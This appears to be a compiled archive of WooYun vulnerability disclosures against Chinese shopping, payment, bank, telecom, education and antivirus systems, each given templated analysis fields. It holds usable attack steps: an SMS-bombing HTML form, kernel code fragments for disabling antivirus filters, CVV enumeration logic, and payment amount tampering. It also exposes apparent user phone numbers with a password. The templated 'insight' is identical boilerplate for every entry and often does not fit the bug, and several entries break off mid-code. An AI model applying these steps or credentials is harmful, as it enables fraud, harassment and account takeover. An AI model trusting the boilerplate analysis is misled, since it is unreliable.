**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: MSSQL 2000 的linkserver 密码虽然加密了，但是跟存储自已数据库的密码加密方式不一样.他的加密是根据密码的长度来决定的.每个字符加密.所以就给了我们机会

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 不用MSSQL2K 升级版本// 也就是现在 MSSQL 2005 将要过时,2008 普及的时候才发出来,但是估计别的大牛都知道了吧// Test By 逗号
---

---
### [wooyun-2015-0132991] 湖北省教育考试院某系统泄漏用户明文密码-可查学生身份信息
**厂商**: 湖北省教育考试院 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 社区进不去了，无奈。没事干查查自己学历……苦bi人士一枚~只是想进入社区学习交流。——————————————————分割线以上闲扯，进入正题地址：湖北省教育考试院自考本科毕业资格认定和课程免考网上审核系统逻辑漏洞**.**.**.**/ClientLogin.aspx----登录页面点击找回密码用户帐号这里，大家恐怕都不陌生了，我随便写个123456 提交好了，密码出来了，现在用查询到的密码登录下，ok。登录成功再用1234567/123654测试下，好了，密码也出来了。登录同样--肯定没问题呀。用字典来的快些，验证码麻烦。————————————————————————本人小鸟，只是测试，没有进一步测试。此漏洞危害性太大，信息泄漏太多，虽然不知道有多少用户，如果不修复又有大批身份信息泄漏。

**POC**: 找回密码成功登录成功，查看学生身份信息---还有大量其他信息可以利用。同样可以登录。

**绕过**: 直接利用

**修复**: 逻辑漏洞，不能随便就给出密码吧。增加身份证信息输入验证即可。
---

---
### [wooyun-2016-0170743] 湖南大学某系统设计逻辑缺陷导致内部信息泄露
**厂商**: hnu.cn;www.hnu.edu.cn | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 湖南大学网上办公系统：https://example.com/[已脱敏]

**POC**: 抓数据包：POST /Home/Login HTTP/1.1Host: oa.hnu.cnContent-Length: 30Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: https://example.com/[已脱敏] 1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like

**绕过**: 直接利用

**修复**: 修复弱口令咯
---

---
### [wooyun-2014-053868] 口袋小安帐号机制漏洞大礼包
**厂商**: dobell.me | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 先对自身账号进行一下抓包一：查看用户信息二：修改用户资料三：修改登录密码

**POC**: 从抓包信息可以看出，缺乏有力的验证手段。对post的数据包进行修改，可以成功查看/更改其他账户的信息。查看任意用户信息姓名 学号 某互联网公司 邮箱 手机号等一览无余修改任意用户资料用户资料成功被重置！修改任意用户密码这里是拿自己的账号做的测试执行后，用原密码已无法登陆，密码重置成功！

**绕过**: 直接利用

**修复**: 编程菜鸟，具体的修补方法我也不会，大致的思想就是做好权限认证。在这里我想说，白帽子进行安全测试时完全没有恶意且不求回报的，我们发现漏洞并及时告知，是为了网络环境更加的安全，就算我们不去发现漏洞，总会有人去发现的，万一被别有用心的人利用，后果不堪设想。ps:第二次提交了，第一次的图貌似挂了，求过！
---

---
### [wooyun-2015-0152459] 木木健康某功能存在设计逻辑缺陷
**厂商**: 广州九木数码科技有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 提交订单未对数量为负数进行验证  导致可买负数个电源适配器  抵消订单总价到此为止

**POC**: 到此为止

**绕过**: 直接利用

**修复**: 验证数量是否为负数送我爸爸一个血压计当礼物怎样？
---

---
### [wooyun-2015-0113759] 知我药妆商城支付漏洞
**厂商**: 知我药妆商城 | **年份**: 2015 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某互联网公司商场存在问题https://example.com/[已脱敏]

**POC**: 1.登陆某互联网公司2.关注 zwyzsc3.下单抓包

**绕过**: 直接利用

**修复**: 你们懂得
---

---
### [wooyun-2015-0129987] 某通信厂商某业务网站支付逻辑漏洞导致任意低金额充值高额度
**厂商**: 某通信设备厂商 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: 同上

**绕过**: 直接利用

**修复**: 虽然我很想要一台免费云主机，但是漏洞还是修复一下吧，后端代码逻辑完全有问题呀，订单金额和充值接口返回的数据都不校验一下。。。
---

---
### [wooyun-2010-0177] Microsoft IE8 window block policy ByPass
**厂商**: Microsoft | **年份**: 2010 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 微软IE8浏览器在处理CSS渲染的expression方法时对window.open的多次执行存在过滤错误, 导致窗口拦截功可被绕过. 攻击者只要在页面中的任意元素加上css poc:expression(window.open(somewhere)),就能让被攻击者在已被block的情况下点击页面任意位置触发弹出窗口.

**POC**: <html><head><title>p.0.c for window block policy bypass</title></head><body><!--This is a P.0.c for ByPass Microsoft Internet Explorer8(onlytest IE8) window block policy. have fun :)======= www.wooyun.org ============== www.80sec.com  ============== www.kevin1986.com ====-->hello&nbsp;<span id="poc"

**绕过**: 过滤绕过

**修复**: 对多次触发window.open做特殊限制.(此建议会影响到部分功能的正常使用 orz)
---

---
### [wooyun-2014-073988] 新华书店某省书城支付业务逻辑漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: 很显然，金额是不对滴～

**绕过**: 直接利用

**修复**: 加判断，加验证。
---

---
### [wooyun-2013-033903] 利用成都电视台iPhone app刷金币的逻辑漏洞
**厂商**: 成都电视台 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 晚上闲着没事从教室回来，发现家里妹子正笑的前仰后合，原来是李伯清的节目。一边笑还一边拿着手机做着上下撸动的姿势，我心里正在纳闷春暖花开万物复苏的季节已经过去很久了才对....莫非...嘿嘿嘿结果妹子跟我说，老公，你帮我摇下金币嘛，我手都摇酸了。老子顿时怒从心头起恶向胆边生，擦，这不是我的福利吗？！说时迟，那时快。爷一把抢过手机就开始撸啊撸，撸到154金币的时候，我瞬间想到......好像金币够换根长长的管子了。（我说的是火腿肠）然后我当然很没节操，也很没技术含量的打开了Brup Suite，提交兑换的时候......我擦，亲，里面居然是直接显示兑换数量的....那当然要没有节操的手贱一把。我就把【1】改成了【-90000000】然后就...............总体而言电视台的这个活动...就是摇金币嘛...还专门各种广告，还找了李伯清老师来给这东西配背景音。小刚刚刚好里面也是各种广告.

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 让我请李伯清老师吃个饭我就告诉你...嘿嘿
---

---
### [wooyun-2013-023789] 某电商平台计算按量付费逻辑漏洞一枚（低价享受超级主机）
**厂商**: 某电商平台 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 看图我可以求个工作么（某社交平台 @蓝小灰想换工作 ）？

**POC**: 而同等配置的包月计费需要2W余元。

**绕过**: 直接利用

**修复**: 1.后端验证带宽，并和页面的取值区间保持一致；2.开启实名认证，出现像洞主这样的人就追究法律责任。
---

---
### [wooyun-2014-076515] 特急送敏感信息泄露漏洞(大量快递面单信息泄露)
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 名称：特急送敏感信息泄露漏洞异常或问题描述：由于逻辑设计缺陷，可悲非授权访问，不法分子可以利用撞库等手段轻松获取其客户及员工的敏感信息甚至泄露客户商业机密。涉及范围：辽宁特急送员工及客户异常解决措施：订单查询输入验证码，增加随即查询密码，订单编号印制的时候采取随即不重复数列取代现有连续编号。异常验证测试记录：通过攻击代码：无攻击复杂度：低认证：无机密性：完全地完整性：无可用性：误具体问题见漏洞证明截图

**POC**: https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 修复方案：增加查询验证码、增加查询密码、快递单号打印的时候不要连续随机不重复即可。
---

---
### [wooyun-2013-036165] 干掉瑞星杀毒监控模块任意玩(POC)
**厂商**: RiSing | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 最新版本,个人版杀毒软件本来都不想测了，后来想想都下载了不找点问题对得起失去的流量吗？void FuckFilters(WCHAR * Name){UNICODE_STRING TName;PDRIVER_OBJECT TDrvObj;PDEVICE_OBJECT CurrentDevice;NTSTATUS status;RtlInitUnicodeString ( &TName, Name);status = ObReferenceObjectByName( &TName,OBJ_CASE_INSENSITIVE,NULL,0,*IoDriverObjectType,KernelMode,NULL,(PVOID*)&TDrvObj);if(NT_SUCCESS(status)){if(TDrvObj){CurrentDevice = TDrvObj->DeviceObject;whil

**POC**: 本来是这样的执行代码后就啥都没了.

**绕过**: 直接利用

**修复**: 我就随便试的，手头没样本，你们更懂危害
---

---
### [wooyun-2012-012760] 百姓网支付漏洞
**厂商**: 百姓网 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: yeepay好像都有这种情况~

**绕过**: 直接利用

**修复**: 金额二次验证隐藏money变量
---

---
### [wooyun-2015-0151352] 17素材设计逻辑缺陷可撞库网站用户获取下载积分（成功账号证明）
**厂商**: 17素材 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 加上验证码
---

---
### [wooyun-2012-07876] 某电商平台应用iphone设计缺陷可无限制猜试密码
**厂商**: 某电商平台网 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: iphone端下测试平台登录界面应用界面

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 调整错误次数过多的ip  或id登录限制
---

---
### [wooyun-2015-0117958] 某网支付漏洞一元购卖3年VIP
**厂商**: lrts.me | **年份**: 2015 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这里抓包把100改1

**POC**: 上面已经说明，先冲懒人币再用懒人币冲VIP

**绕过**: 直接利用

**修复**: 这个你们比我更专业
---

---
### [wooyun-2014-075505] 中秋快乐#某搜索引擎旗下某站支付漏洞一枚
**厂商**: 某搜索引擎 | **年份**: 2014 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 参数注入

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我们先看下任然是我大某搜索引擎花了3000万美元收购的传课网由于我经常看av，对护士这种东西非常敏感https://example.com/[已脱敏] 元总课时：8课时 结束时间：2015年4月8日 担保期：15天妇科，好想要Lu一炮我买下它，但是200块钱，我看快播充个VIP也不用那么多啊，汗https://example.com/[已脱敏] =好的，我们抓包fromPay=fromPay&p5_Pid=189837992%40某域名.com&p3_Amt=200.00&bankId=alipay呵呵，一块钱就好啦，p3

**POC**: 我们先看下任然是我大某搜索引擎花了3000万美元收购的传课网由于我经常看av，对护士这种东西非常敏感https://example.com/[已脱敏] 元总课时：8课时 结束时间：2015年4月8日 担保期：15天妇科，好想要Lu一炮我买下它，但是200块钱，我看快播充个VIP也不用那么多啊，汗https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 用户传输的数据要严查啊。。。
---

---
### [wooyun-2013-036988] 11game密码过于独立容易泄露账户
**厂商**: 11game 11游戏平台 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 刚安装上客户端，此时没有GPClient.db这个文件此时登陆账户是空的我把其他电脑上拷贝的GPClient.db覆盖到11game根目录下登陆看看看看结果成功了

**POC**: 成功登陆，没啥问题

**绕过**: 直接利用

**修复**: 要把机器标识码和账户系统关联，并不是所有密码任意拷贝，这样很容易丢失账户。
---

---
### [wooyun-2013-035437] 易信某短信下发接口限制不当可对手机进行短信轰炸
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 短信接口泄漏 得到的用户可以利用这个漏洞给任何手机发送短信  对于厂商危害性不大  对于我们来说不小 谁都不想自己的手机号乱收短信 希望厂家能修复<form action="https://example.com/[已脱敏]" method="post"><input type="text" value="" name="mobile" /><input type="submit" value="OK" /></form>新建一个文本把上面代码复制进去 保存后缀改成xxx.html打开 输入框输入手机号点击OK就可以发送短信了 刷新一次发送一次

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们都懂
---

---
### [wooyun-2013-042313] 某社区逻辑缺陷可刷学分
**厂商**: fmi.com.cn | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 缺陷:发布日志可以获得2学分，且发布日志不需要任何验证和延迟。发布日志抓包：然后进行批量发包..查看学分:查看日志发布时间:查看日志数量:秒发送日志可刷学分..

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 求厂商鼓励..
---

---
### [wooyun-2013-024639] KTV终端机可跨出沙盒环境（你们唱，我扫个雷。。）
**厂商**: 某KTV点唱程序 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 原因是终端机调用的flash游戏中的链接可以直接打开浏览器新窗口。实际后面有个“关于企业”的功能，也会导致这个问题啦。

**POC**: 游戏中间的广告按钮点击会弹出新网页。然后使用IE浏览器进行跨出（原因是浏览器权限限制不严格）最后上图两张，说明权限...

**绕过**: 直接利用

**修复**: 限制、过滤，程序永远置于顶层啥的，说多也没意思，因为按着我说的方案修大家不都知道了安全策略了么。所以，您看着修复吧。
---

---
### [wooyun-2015-0165923] 西部证券某系统验证码绕过成功爆破
**厂商**: 西部证券 | **年份**: 2015 | **类型**: 后台弱口令

**元思考**: 触发信号: 功能测试

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 全部修改密码。验证
---

---
### [wooyun-2014-049046] 安踏商城用户登陆存在逻辑漏洞可爆破密码
**厂商**: anta.cn | **年份**: 2014 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 安踏商城用户登陆失败后验证码不刷新，且可多次使用，可能导致爆破用户密码。。。

**POC**: 安踏商城用户登陆失败后验证码不刷新，且可多次使用，可能导致爆破用户密码。。。第一次登陆：显示密码错误，但验证码没有改变第二次登陆，不改变验证码：依然只显示密码错误第三次登陆，依然使用之前的验证码，但输入正确密码：显示登陆成功了，证明验证码可多次使用很久没用burpsuite了，也忘记怎么操作了，所以没做爆破测试，但漏洞确实存在，可以测试一下

**绕过**: 直接利用

**修复**: 通过测试和查看页面源码，用的jQuery框架实现的AJAX，在验证用户失败后应该把验证码的SESSION更新并重新发送验证码数据到页面。。。说个题外话，看了下页面的源码，看到了eval('(' + data + ')');这样的源码，感觉这样写不好吧，容易出安全漏洞，jQuery框架不熟悉，其他大牛
---

---
### [wooyun-2013-041755] 58同城某处验证绕过可短信轰炸
**厂商**: 58同城 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: 如上。

**绕过**: 直接利用

**修复**: 后端也要验证啊
---

---
### [wooyun-2013-026393] 某社交平台某社交平台会员购买存支付漏洞
**厂商**: 某社交平台 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 支付的时候选择某电商平台方式，把month改为0.001 到某电商平台那边就变成1分钱，支付后会员开通成功。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们懂的
---

---
### [wooyun-2014-066549] 厦门天心门户建站系统存在支付漏洞
**厂商**: 厦门天心 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 也就修改下支付金额的value即可，涉及的网站蛮多103个网站以上 具体哪些网站。存在漏洞网站地址 https://example.com/[已脱敏] 里面网站基本都存在这漏洞 算不算通用？

**绕过**: 直接利用

**修复**: 加个后台校验
---

---
### [wooyun-2012-05850] 某互联网公司网盘信息泄漏！
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 用过某互联网公司网盘的人都知道，如果设置在某互联网公司网盘上设置密码之后，每次启动某互联网公司网盘是需要输入密码才可以进入的。但是，如果用手机管家（因为一般都设置了自动登录，无需再输入某互联网公司密码），直接就可以读取到网盘的信息。危害：如果手机丢失，坏淫们会读取到你某互联网公司网盘内存放的各种密码、看到各种妹子照片等等。。

**POC**: 1、启动手机管家2、进入某互联网公司网盘

**绕过**: 直接利用

**修复**: 添加密码登录。（您比我专业~但是你们不长记性，基本一样的漏洞让我提交两次，我都蛋疼了。）
---

---
### [wooyun-2015-0152609] ATA考试系统可被绕过沙盒
**厂商**: ATA公司 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先但看到这个系统出现俩个思路1.利用系统自带快捷键，调出第三方软件。例如，windows键，例如ctrl+shift+ec等2.利用第三方输入法。例如，某输入法的“关于”>官方网站ps上面俩张图是我电脑上截的图，下面复现的时候是考试当时拍的！3.利用5次shift键，(本例中用到的正是此种方法)============================复现过程(经过测试此次绕过前俩种方法不能绕过，第三中方法可绕过)成功调出cmd

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 加强输入验证
---

---
### [wooyun-2015-0153853] 方特旅游官网某系统设计逻辑缺陷
**厂商**: 方特网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞地址：https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 增加验证码防止爆破
---

---
### [wooyun-2012-013123] 聚U慧商城支付漏洞订单金额修改任意数额
**厂商**: 聚U慧 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 拍下QB充值修改订单金额可以成功拍下该物品

**POC**: 可随意修改物品金额并提交

**绕过**: 直接利用

**修复**: 修改提交方式 服务端返回验证
---

---
### [wooyun-2013-035197] 某游戏平台 DLL劫持漏洞
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试版本：[IP已脱敏]具体利用方法：假如某游戏平台安装在C盘劫持路径：C:\Program Files\Tencent\某互联网公司Game\某互联网公司Game.exe运行时会加载一个不存在的DLL文件dwmapi.dll，只要自己写一个dwmapi.dll与某互联网公司Game.exe放在同一目录，这样就可以在运行某互联网公司Game.exe的时候会同时加载dwmapi.dll，这个dwmapi.dll可以为自制的任意恶意dll。此方法可用于劫持启动木马病毒。（我这里放入特定的dll后，运行某互联网公司Game.exe会弹出一个特定的框显示"Hello from MyDLL!"，如下图）当时劫持时使用的DLL下载地址：密码58n6https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们比我懂！！！
---

---
### [wooyun-2015-0154731] 泛在微讲堂设计逻辑缺陷导致任意重置用户密码
**厂商**: 智联迅捷泛在微讲堂 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、首先注册一个用户2、然后使用网站的忘记密码功能http://**.**.**.**/Login/ForgetPassword进行密码重置，邮箱填一个自己的邮箱即可3、很快邮箱就收到系统发送的密码重置链接4、然后跟着链接就可以重置用户密码了

**POC**: 登录成功

**绕过**: 直接利用

**修复**: 重置密码应该使用用户注册时的提供的邮箱。
---

---
### [wooyun-2015-0110527] p2p金融安全之财智魔方某严重逻辑漏洞(影响用户资金安全)
**厂商**: caizhimofang.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 安全问题：财智魔方任意账户密码重置复现步骤：https://example.com/[已脱敏]

**POC**: 找个手机号吧中间4位打码难不倒我吖：18618117600  密码：gaimimaya ，说好的一千两百万呢应该指的是流水一千多万吧周排名第二的人：13521662930  密码：gaimimaya ，说好的两百万呢

**绕过**: 直接利用

**修复**: 有节操的白帽子，仅测试漏洞
---

---
### [wooyun-2014-086215] 某国有银行业务流程审核逻辑不严导致可枚举任意信用卡cvv码
**厂商**: 某国有银行 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 通过注册网银可以刺探用户是否开通网银（如果用户没注册，可以用于暴力破解查询密码）如果开通，可以通过重置密码服务的第2步要求输入信用卡有效期，校验码(cvv),身份证，验证码界面，输入任意信息后确认，在下一步的业务处理逻辑中由于会优先判断用户cvv码是否正确，导致即使其他信息错误，也会先提示cvv码错误。由于已知cvv码为3为数字，且用户不得更改，所以此业务逻辑可以用来刺探用户cvv信息。同时信用卡有效期为年月且一般为3-5年，所以在填写正确cvv后，同理也可枚举信用卡有效期。

**POC**: 下列网址可以刺探用户是否开通网银（如果用户没注册，可以用于暴力破解查询密码）mask 区域1.https://**.**.**/***/***.jspreqCardNo=622253******1251此处16位数字为信用卡卡号，该测试卡号为随机卡号。如果开通，可以通过下面网址重置密码mask 区域1.https://**.**.**/***/***/syResetpwd.do此处：mask 区域1.https://**.**.**/***/***.jspreqCardNo=信用卡号重置密码第2步要求输入信用卡有效期，校验码(cvv),身份证，验证码，任意输入信息后确认，在下一步的业务处理逻辑

**绕过**: 直接利用

**修复**: 可以优先判断身份证信息，然后判断有效期，最后判断cvv吗。
---

---
### [wooyun-2014-087263] 我是如何用流氓软件kill掉流氓软件的
**厂商**: 某安全厂商 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 海绵宝宝大牛说乌云要开始收二进制漏洞,于是本想下个沙盒bypass一下没想到…file:TailList.syskillk.exekillk看了眼是upx,手脱很简单,找几个脱壳机也分分钟.F8 单步 --> 下断 F9 --> 进入循环 下断 --> F8jmp入点口 --> dump发现写了一个sys出来,早知道监控下文件就好了 Orz..分析sys吧,简单发一下过程.::00010BC0::  68 B00A0100              PUSH 10AB0                          // 驱动入口::00010BC5::  E8 4A050000              CALL 00011114::00010BCA::  83C4 08                  ADD ESP,8::00010BCD::  8B45 08         

**POC**: 写了个小软件配合sys成功kill掉360.给出demohttps://example.com/[已脱敏]  6wed解压密码：wooyun

**绕过**: 直接利用

**修复**: :p
---

---
### [wooyun-2014-062101] 某运营商某系统逻辑错误可找回员工用户密码
**厂商**: 某运营商 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某运营商网上学院找回密码处存在逻辑漏洞，导致可以找回部分用户的密码——选择找回密码，用回答问题的方式找回，然后，在答案处输入“123456”即可找回密码。所以，说大多数是因为所选择的账户必须在之前登陆过该网站并留下密码找回问题方可利用该漏洞。网址：https://example.com/[已脱敏]

**POC**: 找测试用户的话可以谷歌"@chinaunicom.cn"。这里留两份用户姓名与网站账号的对应表：https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 源码审计......
---

---
### [wooyun-2011-03100] 某电商平台浏览器远程跨域漏洞
**厂商**: 某电商平台 | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

